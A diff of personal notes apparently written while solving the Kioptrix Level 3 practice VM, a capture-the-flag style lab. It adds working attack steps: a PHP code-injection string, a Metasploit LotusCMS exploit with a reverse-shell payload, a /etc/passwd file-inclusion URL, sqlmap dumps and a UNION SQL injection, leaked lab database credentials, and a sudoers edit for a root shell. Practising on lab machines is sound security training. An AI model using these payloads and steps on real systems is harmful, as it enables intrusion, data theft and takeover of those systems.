@@ -1,3 +1,6 @@
+top blogs
+http://www.gcura.tech/kioptrix-level-1-2-3/
+
 #
 0. Vulnerabilities
 
@@ -30,7 +33,8 @@ page=index');${system('id')};#
 2.1.2 With Metasploit LotusCMS
 use exploit/multi/http/lcms_php_exec
 set rhost <ip-victim>
-set url /
+set URI /
+# u r i not url
 set payload php/meterpreter/reverse_tcp
 set lhost <ip-host>
 
@@ -55,12 +59,42 @@ dirb http://192.168.75.132/gallery -X .php | grep 200
 192.168.75.132/gallery/gallery.php?id=1
 sqlmap -u "http://192.168.75.132/gallery/gallery.php?id=1" -a
 
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 #https://kongwenbin.wordpress.com/2016/10/30/writeup-for-kioptrix-level-1-2-3/
-1. Brue SSH
-2. sudo -l
- (root) NOPASSWD: /usr/local/bin/ht
+#if there is 22 port, that means need to brute ssh
+#if you carefully read site you will get name - "loneferret"
+#other way -  exploit vulnerability "File inclesion"
+https://www.offensive-security.com/metasploit-unleashed/file-inclusion-vulnerabilities/
+http://192.168.195.134/index.php?system=../../../../../../etc/passwd%00.
+#important "%00." in the end
 
-#that means thas loneferret can run ht as a root
+#and get access to DB with sqlmap
+#vuln paramet
+http://kioptrix3.com/gallery/gallery.php?id=1
+#gallery-home-ligoat_press_room (sort options)
+
+
+#http://www.gcura.tech/kioptrix-level-1-2-3/
+sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" -p id -T dev_accounts --dump
+#manual SQLi
+http://breakthesecurity.cysecurity.org/2010/12/hacking-website-using-sql-injection-step-by-step-guide.html
+#for vuln parametr
+-1  union select 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema=database()--
+
+# form shell form msf we can found file gallry/gconfig.php
+#http://www.gcura.tech/kioptrix-level-1-2-3/
+#	$GLOBALS["gallarific_mysql_server"] = "localhost";
+	$GLOBALS["gallarific_mysql_database"] = "gallery";
+	$GLOBALS["gallarific_mysql_username"] = "root";
+	$GLOBALS["gallarific_mysql_password"] = "fuckeyou";
+#<ip_remote>/phpmyadmin/
+#gallery-dev_accounts
+#user names
+
+1. Brute ssh sith login "loneferret"
+2. login with "loneferret" and #sudo -l
+ (root) NOPASSWD: /usr/local/bin/ht
+#that means loneferret can run ht as a root
 3. ht, F3(open), /etc/sudoers
 4. add to line loneferret ALL=NOPASSWD: ... /bin/bash
 5. sudo /bin/bash
